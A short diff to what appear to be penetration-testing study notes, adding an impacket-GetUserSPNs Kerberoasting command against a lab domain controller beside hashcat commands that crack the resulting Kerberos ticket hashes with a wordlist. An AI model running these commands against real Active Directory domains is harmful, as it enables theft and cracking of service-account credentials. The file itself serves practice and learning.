@@ -129,6 +129,7 @@ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr
 
 ## Linux 
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+impacket-GetUserSPNs -dc-ip 192.168.217.40  hokkaido-aerospace.com/discovery -request 
 sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
